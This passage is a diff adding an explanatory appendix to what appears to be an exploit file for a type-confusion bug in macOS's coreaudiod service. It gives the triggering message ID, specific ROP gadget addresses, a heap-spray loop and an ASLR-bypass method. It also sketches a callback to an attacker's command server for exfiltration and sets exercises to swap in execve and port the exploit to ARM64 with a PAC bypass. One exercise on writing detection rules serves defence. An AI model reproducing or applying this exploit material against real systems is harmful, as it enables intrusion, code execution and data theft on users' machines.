+ * │ WITHOUT THIS: We might try to write to /tmp (sandbox blocked) or           │
+ * │ somewhere the sandbox denies. Understanding entitlements tells us          │
+ * │ what file operations will SUCCEED post-exploitation.                       │
+ * └─────────────────────────────────────────────────────────────────────────────┘
+ *
+ * ┌─────────────────────────────────────────────────────────────────────────────┐
+ * │ EXPERIMENT 3: Sandbox profile                                               │
+ * │                                                                             │
+ * │ FINDING: (allow network*) in the sandbox rules                             │
+ * │                                                                             │
+ * │ IMPLICATION: Post-exploitation, we have UNRESTRICTED network access!       │
+ * │                                                                             │
+ * │ HOW A REAL ATTACKER WOULD USE THIS:                                        │
+ * │ Instead of our simple "create a file" proof-of-concept, they would:        │
+ * │                                                                             │
+ * │   // In their ROP chain, call:                                             │
+ * │   socket(AF_INET, SOCK_STREAM, 0);                                         │
+ * │   connect(sockfd, &attacker_c2_server, sizeof(addr));                      │
+ * │   // Now exfiltrate data or receive commands!                              │
+ * │                                                                             │
+ * │ WITHOUT THIS: We might assume network is blocked and not bother.           │
+ * │ Knowing it's allowed changes the attack from "demo" to "weaponized".       │
+ * └─────────────────────────────────────────────────────────────────────────────┘
+ *
+ * ┌─────────────────────────────────────────────────────────────────────────────┐
+ * │ EXPERIMENTS 4-5: dyld extraction + nm symbols                               │
+ * │                                                                             │
+ * │ FINDING: 79 MIG handlers, class hierarchy, vulnerable function address     │
+ * │                                                                             │
+ * │ USED IN multiple places:                                                    │
+ * │                                                                             │
+ * │ 1. Knowing the MESSAGE ID for the vulnerable handler:                      │
+ * │    $ nm CoreAudio | grep __XIOContext_Fetch_Workgroup_Port                 │
+ * │    → Cross-reference with MIG definitions to find message ID 1010059       │
+ * │                                                                             │
+ * │    // In triggerVulnerability():                                           │
+ * │    mach_msg_header_t msg;                                                  │
+ * │    msg.msgh_id = 1010059;  // <-- FROM EXPERIMENT 5!                       │
+ * │                                                                             │
+ * │ 2. Understanding the object hierarchy:                                      │
+ * │    $ nm CoreAudio | grep HALS_Engine                                       │
+ * │    → HALS_Engine exists, has different layout than HALS_IOContext          │
+ * │                                                                             │
+ * │    // In exploit logic, we create an Engine object:                        │
+ * │    engine_id = createEngineObject();  // Returns 'ngne' type object        │
+ * │    triggerVulnerability(engine_id);   // Pass Engine ID where IOContext    │
+ * │                                        // is expected = TYPE CONFUSION!   │
+ * │                                                                             │
+ * │ WITHOUT THIS: We wouldn't know what message to send or what object         │
+ * │ types exist for the confusion.                                             │
+ * └─────────────────────────────────────────────────────────────────────────────┘
+ *
+ * ┌─────────────────────────────────────────────────────────────────────────────┐
+ * │ EXPERIMENT 7: ROPgadget                                                     │
+ * │                                                                             │
+ * │ FINDING: 26,923 gadgets, including stack pivots and register setters       │
+ * │                                                                             │
+ * │ USED IN build_rop.py, these addresses come from ROPgadget output:          │
+ * │                                                                             │
+ * │   STACK_PIVOT_GADGET  = 0x7ff810b908a4  # xchg rsp, rax ; ret              │
+ * │   POP_RDI_GADGET      = 0x7ff80f185186  # pop rdi ; ret                    │
+ * │   POP_RSI_GADGET      = 0x7ff811fa1e36  # pop rsi ; ret                    │
+ * │   POP_RDX_GADGET      = 0x7ff811cce418  # pop rdx; ret                     │
+ * │   POP_RAX_GADGET      = 0x7ff811c93b09  # pop rax; ret                     │
+ * │   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^                     │
+ * │   ALL OF THESE came from searching the ROPgadget output!                   │
+ * │                                                                             │
+ * │ The process:                                                                │
+ * │   $ ROPgadget --binary /tmp/extracted/CoreAudio > gadgets.txt              │
+ * │   $ grep "xchg.*rsp" gadgets.txt   # Find stack pivots                     │
+ * │   $ grep "pop rdi" gadgets.txt     # Find RDI control                      │
+ * │   $ grep "pop rsi" gadgets.txt     # Find RSI control                      │
+ * │   ... and so on for each register we need to control                       │
+ * │                                                                             │
+ * │ WITHOUT THIS: No ROP chain, no code execution. Just a crash.               │
+ * └─────────────────────────────────────────────────────────────────────────────┘
+ *
+ * ┌─────────────────────────────────────────────────────────────────────────────┐
+ * │ EXPERIMENTS 9-10: heap + vmmap                                              │
+ * │                                                                             │
+ * │ FINDING: Engine objects are 1152 bytes, MALLOC_SMALL zone                  │
+ * │                                                                             │
+ * │ USED IN the heap spray loop:                                                │
+ * │                                                                             │
+ * │   // Spray strings of specific size to land in same zone as Engine        │
+ * │   #define SPRAY_STRING_SIZE 1100  // ~1152 bytes with CFString header     │
+ * │   #define SPRAY_ITERATIONS  100                                            │
+ * │   #define STRINGS_PER_ITERATION 50                                         │
+ * │                                                                             │
+ * │   for (int i = 0; i < SPRAY_ITERATIONS; i++) {                             │
+ * │       CFMutableDictionaryRef spray_dict = CFDictionaryCreateMutable(...); │
+ * │       for (int j = 0; j < STRINGS_PER_ITERATION; j++) {                    │
+ * │           // Create string of SPRAY_STRING_SIZE bytes                      │
+ * │           // containing our ROP chain data                                 │
+ * │           CFStringRef key = ...;                                           │
+ * │           CFDataRef value = CFDataCreate(NULL, rop_payload, 1152);        │
+ * │                                                     ^^^^^                   │
+ * │                                                     FROM EXPERIMENT 9!     │
+ * │           CFDictionarySetValue(spray_dict, key, value);                    │
+ * │       }                                                                     │
+ * │       // Send to coreaudiod via SetPropertyData                            │
+ * │       sendPropertyUpdate(spray_dict);                                      │
+ * │   }                                                                         │
+ * │                                                                             │
+ * │ FINDING: dyld shared cache at same address across processes                │
+ * │                                                                             │
+ * │ USED IN: ASLR bypass - we can calculate gadget addresses from              │
+ * │          our own process's view of the cache!                               │
+ * │                                                                             │
+ * │ WITHOUT THIS: Wrong spray size = data lands in wrong zone = failure.       │
+ * │ Wrong ASLR slide = gadget addresses point to garbage = crash.              │
+ * └─────────────────────────────────────────────────────────────────────────────┘
+ *
+ * THE FULL PICTURE:
+ * ─────────────────
+ * Every experiment serves a PURPOSE. None of them are "just for fun":
+ *
+ *   ┌──────────────────┐     ┌────────────────────────────────────────────────┐
+ *   │ Experiment 1     │ ──► │ Service name for bootstrap_look_up()          │
+ *   │ launchctl        │     │                                                │
+ *   └──────────────────┘     └────────────────────────────────────────────────┘
+ *
+ *   ┌──────────────────┐     ┌────────────────────────────────────────────────┐
+ *   │ Experiment 2     │ ──► │ Know what file writes will succeed             │
+ *   │ codesign         │     │ (entitlements grant SIP bypass)                │
+ *   └──────────────────┘     └────────────────────────────────────────────────┘
+ *
+ *   ┌──────────────────┐     ┌────────────────────────────────────────────────┐
+ *   │ Experiment 3     │ ──► │ Know post-exploitation capabilities           │
+ *   │ sandbox          │     │ (network = download implant, exfil data)      │
+ *   └──────────────────┘     └────────────────────────────────────────────────┘
+ *
+ *   ┌──────────────────┐     ┌────────────────────────────────────────────────┐
+ *   │ Experiments 4-5  │ ──► │ Message IDs, function addresses, class types  │
+ *   │ ipsw + nm        │     │ (which message triggers bug, which object)    │
+ *   └──────────────────┘     └────────────────────────────────────────────────┘
+ *
+ *   ┌──────────────────┐     ┌────────────────────────────────────────────────┐
+ *   │ Experiment 7     │ ──► │ ROP gadget addresses for payload              │
+ *   │ ROPgadget        │     │ (each gadget controls one step of execution)  │
+ *   └──────────────────┘     └────────────────────────────────────────────────┘
+ *
+ *   ┌──────────────────┐     ┌────────────────────────────────────────────────┐
+ *   │ Experiments 9-10 │ ──► │ Heap spray size, ASLR slide                    │
+ *   │ heap + vmmap     │     │ (spray lands correctly, gadgets resolve)      │
+ *   └──────────────────┘     └────────────────────────────────────────────────┘
+ *
+ * THE LESSON:
+ * ───────────
+ * Exploitation is not magic. It's methodical information gathering followed
+ * by precise application of that information. Each "random command" you saw
+ * in this appendix feeds directly into a specific part of the exploit.
+ *
+ * This is what separates script kiddies from security researchers:
+ *   - Script kiddy: Runs exploit, doesn't understand why it works or fails
+ *   - Researcher: Understands every byte, can adapt when things change
+ *
+ * When Apple patches this bug, the exploit breaks. But a researcher who
+ * understands the methodology can find ANOTHER bug and exploit THAT too,
+ * because the skills transfer. The bug is specific; the methodology is general.
+ *
+ * ═══════════════════════════════════════════════════════════════════════════
+ * B.7 EXERCISES FOR THE READER
+ * ═══════════════════════════════════════════════════════════════════════════
+ *
+ * If you've followed along and run the commands, try these challenges:
+ *
+ * ┌─────────────────────────────────────────────────────────────────────────────┐
+ * │ EXERCISE 1: VARIANT HUNTING (Beginner)                                      │
+ * │                                                                             │
+ * │ The bug affects __XIOContext_Fetch_Workgroup_Port. We know there are       │
+ * │ 16 other __XIOContext_* handlers. How many are also vulnerable?            │
+ * │                                                                             │
+ * │ STEPS:                                                                      │
+ * │   1. $ nm /tmp/extracted/CoreAudio | grep __XIOContext                     │
+ * │   2. For each handler, disassemble and check:                               │
+ * │      - Does it call CopyObjectByObjectID()?                                │
+ * │      - Does it validate the object type BEFORE using offset 0x68?         │
+ * │   3. Document which handlers are safe vs. vulnerable                        │
+ * │                                                                             │
+ * │ EXPECTED: You should find 6 vulnerable handlers total (as Apple patched)  │
+ * └─────────────────────────────────────────────────────────────────────────────┘
+ *
+ * ┌─────────────────────────────────────────────────────────────────────────────┐
+ * │ EXERCISE 2: GADGET CHAIN MODIFICATION (Intermediate)                        │
+ * │                                                                             │
+ * │ The current ROP chain calls open() to create a file. Modify it to call    │
+ * │ execve() instead, spawning /usr/bin/id.                                    │
+ * │                                                                             │
+ * │ STEPS:                                                                      │
+ * │   1. Look up the execve syscall number (hint: macOS is 0x200003B)          │
+ * │   2. Find gadgets to set RDI (path), RSI (argv), RDX (envp)               │
+ * │   3. The path "/usr/bin/id" needs to be in the spray                       │
+ * │   4. argv must be ["/usr/bin/id", NULL]                                    │
+ * │   5. Modify build_rop.py with your new chain                               │
+ * │                                                                             │
+ * │ CHALLENGE: envp can be NULL, but argv cannot. How do you get a pointer    │
+ * │ to a NULL-terminated array on the sprayed heap?                            │
+ * └─────────────────────────────────────────────────────────────────────────────┘
+ *
+ * ┌─────────────────────────────────────────────────────────────────────────────┐
+ * │ EXERCISE 3: DETECTION RULE WRITING (Blue Team)                              │
+ * │                                                                             │
+ * │ Write a detection rule for this exploit. Choose one:                        │
+ * │   A) YARA rule for the heap spray pattern                                  │
+ * │   B) Endpoint detection for anomalous coreaudiod behavior                  │
+ * │   C) Network-based detection for C2 from coreaudiod                        │
+ * │                                                                             │
+ * │ HINTS:                                                                      │
+ * │   - Heap spray: DeviceSettings.plist > 5MB                                 │
+ * │   - Behavior: coreaudiod spawning children, making network connections     │
+ * │   - Network: coreaudiod shouldn't connect to non-Apple IPs                 │
+ * │                                                                             │
+ * │ BONUS: Test your rule against the exploit and verify detection!            │
+ * └─────────────────────────────────────────────────────────────────────────────┘
+ *
+ * ┌─────────────────────────────────────────────────────────────────────────────┐
+ * │ EXERCISE 4: ARM64 PORT (Advanced)                                           │
+ * │                                                                             │
+ * │ This exploit targets x86_64. Port it to ARM64 (Apple Silicon).             │
+ * │                                                                             │
+ * │ CHALLENGES:                                                                 │
+ * │   1. Different register conventions (x0-x7 for args, x30 for LR)          │
+ * │   2. Pointer Authentication (PAC) - you need PAC bypass or signing         │
+ * │   3. Different gadget patterns (ARM64 instructions are fixed width)        │
+ * │   4. Different syscall ABI (svc #0x80, syscall number in x16)             │
+ * │                                                                             │
+ * │ RESEARCH STARTING POINTS:                                                   │
+ * │   - Apple's PAC implementation has known weaknesses                        │
+ * │   - Some gadgets don't use authenticated returns                           │
+ * │   - JIT regions might have weaker PAC enforcement                          │
+ * └─────────────────────────────────────────────────────────────────────────────┘
  *
  * ═══════════════════════════════════════════════════════════════════════════
  *
